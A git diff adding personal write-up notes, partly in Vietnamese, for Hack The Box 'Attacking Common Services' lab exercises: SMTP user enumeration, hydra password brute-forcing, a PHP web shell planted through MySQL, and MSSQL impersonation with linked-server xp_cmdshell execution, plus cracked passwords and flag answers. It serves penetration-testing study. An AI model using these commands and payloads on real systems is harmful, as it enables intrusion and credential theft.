@@ -297,3 +297,472 @@ ns.inlanefreight.htb.
 127.0.0.1
 inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
 ```
+
+# Attacking Email Services
+
++ 1  What is the available username for the domain inlanefreight.htb in the SMTP server?
+
+```zsh
+❯ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.96.172
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 06:01 EDT
+Nmap scan report for inlanefreight.htb (10.129.96.172)
+Host is up.
+
+PORT    STATE    SERVICE    VERSION
+25/tcp  filtered smtp
+110/tcp filtered pop3
+143/tcp filtered imap
+465/tcp filtered smtps
+587/tcp filtered submission
+993/tcp filtered imaps
+995/tcp filtered pop3s
+```
+
+```
+❯ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.96.172
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Thu May  8 06:44:49 2025 #########
+10.129.96.172: marlin@inlanefreight.htb exists
+######## Scan completed at Thu May  8 06:45:25 2025 #########
+1 results.
+
+79 queries in 36 seconds (2.2 queries / sec)
+
+```
+
+
+
++ 1  Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
+```zsh
+❯ hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 pop3 -I -v
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-09 02:57:46
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
+[DATA] attacking pop3://10.129.203.12:110/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] CAPABILITY: +OK CAPA list follows
+USER
+UIDL
+TOP
+.
+[VERBOSE] using POP3 CLEAR LOGIN mechanism
+[110][pop3] host: 10.129.203.12   login: marlin@inlanefreight.htb   password: poohbear
+[STATUS] attack finished for 10.129.203.12 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-09 02:58:04
+```
+
+![](images/11.png)
+
+# Attacking Common Services - Easy
+We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:
+
+- `HTB{...}`
+
+Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
++ 2  You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer
+
+#### Nmap
+
+```zsh
+❯ sudo nmap -sS -T 4 --min-rate 3000 -p- 10.129.255.218 -Pn -v
+PORT     STATE SERVICE
+21/tcp   open  ftp
+25/tcp   open  smtp
+80/tcp   open  http
+443/tcp  open  https
+587/tcp  open  submission
+3306/tcp open  mysql
+3389/tcp open  ms-wbt-server
+```
+![](images/13.png)
+#### Web page
+
+![](images/12.png)
+
+
+#### Nhận định ban đầu
+
+Có thể liên quan đến mysql, upload shell qua SQLserver và gọi payload trên web hoặc tải lên webshell
+
+#### Enumeration
+
+SMTP enumeration found nothing.
+
+![](images/14.png)
+
+##### FTP bruteforce
+
+Không có gì...
+
+![](images/15.png)
+
+##### DNS Enum
+
+same
+
+![](images/16.png)
+
+
+Đến đoạn này thấy cấn cấn nên tôi đã reset lại lab rồi smtp lại...
+
+##### Roll back
+
+here we go!!!!!
+
+```zsh
+❯ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.255.150
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Fri May  9 04:03:49 2025 #########
+10.129.255.150: fiona@inlanefreight.htb exists
+######## Scan completed at Fri May  9 04:04:12 2025 #########
+1 results.
+
+79 queries in 23 seconds (3.4 queries / sec)
+
+```
+
+#### Footprinting
+
+###### Brute force fiona's password
+
+found no result with password list hackthebox provide. Try to use `rockyou.txt`
+```zsh
+❯ hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.255.150 -I -s 25
+```
+
+![](images/17.png)
+
+login: fiona@inlanefreight.htb   password: 987654321
+
+##### MYSQL access
+
+```zsh
+❯ mysql -h 10.129.255.150 -ufiona -p --ssl=false
+```
+
+##### GET THE FLAG
+
+```sql
+MariaDB [(none)]> select LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
++------------------------------------------------------+
+| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
++------------------------------------------------------+
+| HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}              |
++------------------------------------------------------+
+1 row in set (0.256 sec)
+
+```
+
+Nếu không rõ đường dẫn cụ thể, chúng ta có thể upload một web shelll.
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdoc/shell.php';
+```
+
+Sau đó gọi payload:
+
+```zsh
+❯ curl 'http://10.129.255.150/shell.php?c=type%20C:\Users\Administrator\Desktop\flag.txt'
+HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49} 
+```
+
+# Attacking Common Services - Medium
+
+The second server is an internal server (within the `inlanefreight.htb` domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
+
+#### Questions
+
++ 2  Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.
+
+### nmap
+```zsh
+❯ sudo nmap -sS -T 4 --min-rate 3000 -p- 10.129.255.113  -Pn -v
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+110/tcp   open  pop3
+995/tcp   open  pop3s
+2121/tcp  open  ccproxy-ftp
+30021/tcp open  unknown
+```
+
+Quét sâu hơn
+
+```zsh
+❯ sudo nmap -sCV -T 4 --min-rate 3000 -p- 10.129.255.113 --source-port 53
+```
+
+Phát hiện ra rằng có một dịch vụ ftp khác đang chạy trên cổng lớn 30021.
+
+![](images/18.png)
+
+
+### FTP
+
+We can login anonymous this port  then get the important file from `simon` folder.
+![](images/19.png)
+
+### GET password of simon
+
+I tried ssh and pop3 but no luck:
+```zsh
+❯ hydra -l simon@inlanefreight.htb -P mynotes.txt -f 10.129.255.113 pop3
+```
+
+```zsh
+❯ hydra -l simon@inlanefreight.htb -P mynotes.txt ssh://10.129.255.113 -I
+```
+
+![](images/20.png)
+
+The right destination is here:
+
+```zsh
+❯ hydra -l simon -P mynotes.txt -f 10.129.255.113 ftp -s 2121
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-09 04:59:59
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking ftp://10.129.255.113:2121/
+[2121][ftp] host: 10.129.255.113   login: simon   password: 8Ns8j1b!23hs4921smHzwn
+[STATUS] attack finished for 10.129.255.113 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-09 05:00:09
+
+```
+
+### FTP port 2121
+
+```zsh
+ftp 10.129.255.113 2121
+```
+
+We got some files.
+
+![](images/21.png)
+
+#### FLAG
+```zsh
+❯ cat flag.txt
+HTB{1qay2wsx3EDC4rfv_M3D1UM}
+```
+
+Wait, why it is too easy?
+
+I tried again :))
+
+![](images/22.png)
+
+![](images/23.png)
+
+# Attacking Common Services - Hard
+
+---
+
+The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.
+
+
+### NMAP
+
+```zsh
+❯ sudo nmap -sS -T 4 --min-rate 3000 -p- 10.129.203.10 -Pn -v
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 05:10 EDT
+Initiating Parallel DNS resolution of 1 host. at 05:10
+Completed Parallel DNS resolution of 1 host. at 05:10, 0.06s elapsed
+Initiating SYN Stealth Scan at 05:10
+Scanning 10.129.203.10 [65535 ports]
+Discovered open port 3389/tcp on 10.129.203.10
+Discovered open port 445/tcp on 10.129.203.10
+Discovered open port 135/tcp on 10.129.203.10
+Discovered open port 1433/tcp on 10.129.203.10
+Completed SYN Stealth Scan at 05:10, 44.06s elapsed (65535 total ports)
+Nmap scan report for 10.129.203.10
+Host is up (0.25s latency).
+Not shown: 65531 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s
+3389/tcp open  ms-wbt-server
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 44.18 seconds
+           Raw packets sent: 131094 (5.768MB) | Rcvd: 46 (2.236KB)
+```
+
+#### Questions
+
++ 0  What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
+
+```zsh
+❯ smbmap -u simon -H 10.129.203.10
+```
+
+![](images/24.png)
+
+There are 3 users in IT group:
+```zsh
+❯ smbmap -u simon -H 10.129.203.10 -r Home/IT
+```
+
+![](images/26.png)
+
+We got the file random.txt belong to Simon
+
+```zsh
+❯ smbmap -u simon -H 10.129.203.10 -r Home/IT/Simon
+```
+
+![](images/25.png)
+
+### Get some files
+
+```zsh
+❯ smbmap -u simon -H 10.129.203.10 --download Home/IT/Simon/random.txt
+❯ smbmap -u simon -H 10.129.203.10 --download Home/IT/Fiona/creds.txt
+❯ smbmap -u simon -H 10.129.203.10 --download Home/IT/John/information.txt
+❯ smbmap -u simon -H 10.129.203.10 --download Home/IT/John/notes.txt
+❯ smbmap -u simon -H 10.129.203.10 --download Home/IT/John/secrets.txt
+```
+
++ 0  Enumerate the target and find a password for the user Fiona. What is her password?
+
+### MSSQL
+
+```zsh
+❯ cat 10.129.203.10-Home_IT_Fiona_creds.txt
+Windows Creds
+
+kAkd03SA@#!
+48Ns72!bns74@S84NNNSl
+SecurePassword!
+Password123!
+SecureLocationforPasswordsd123!!
+❯ xfreerdp3 /v:10.129.203.10 /u:fiona /p:48Ns72!bns74@S84NNNSl
+zsh: event not found: bns74@S84NNNSl
+❯ xfreerdp3 /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
+```
++ 0  Once logged in, what other user can we compromise to gain admin privileges?
+
+Thử query user trên máy mục tiêu nhưng chỉ có mỗi user fiona, chúng ta không thể ăn cắp phiên thông qua rdp, giờ chỉ còn mssql là đáng nghi nhất.
+
+```zsh
+❯ sqsh -S 10.129.203.10 -U .\\fiona -P '48Ns72!bns74@S84NNNSl' -h
+```
+
+```sql
+1> SELECT distinct b.name
+2> FROM sys.server_permissions a
+3> INNER JOIN sys.server_principals b
+4> ON a.grantor_principal_id = b.principal_id
+5> WHERE a.permission_name = 'IMPERSONATE'
+6> go
+
+        john
+        simon
+```
+
+Let's verify if our current user has the sysadmin role:
+
+```sql
+1> EXECUTE AS LOGIN = 'john'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> go
+```
+
+Không có quyền sysadmin, hmm vậy nó phải có ý nghĩa gì đó khi có thể mạo danh được `john`
+
+### LINKED SERVER MSSQL
+
+```sql
+1> SELECT srvname, isremote FROM sysservers
+2> go
+
+        WINSRV02\SQLEXPRESS
+               1
+
+        LOCAL.TEST.LINKED.SRV
+               0
+
+```
+
++ 2  Submit the contents of the flag.txt file on the Administrator Desktop.
+
+
+```sql
+1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+```
+
+Như vậy chúng ta có quyền sysadmin trong máy chủ được liên kết
+
+![](images/27.png)
+
+Bây giờ hãy thực thi lệnh và đọc file để lấy nội dung của flag.txt
+
+```sql
+1> EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+1>  EXEC ('EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+1> EXEC ('EXEC xp_cmdshell “whoami”') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+Msg 102, Level 15, State 1
+Server 'WIN-HARD\SQLEXPRESS', Line 1
+Incorrect syntax near '“'.
+1> EXEC ('EXEC xp_cmdshell "whoami"') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+
+        nt authority\system
+
+        NULL                                                                                                                                                          
+```
+
+Ok giờ đơn giản là đọc file flag.txt thôi
+
+```sql
+1> EXEC ('EXEC xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt"') AT [LOCAL.TEST.LINKED.SRV]
+2> go
+
+        HTB{46u$!n9_l!nk3d_$3rv3r$}
+```
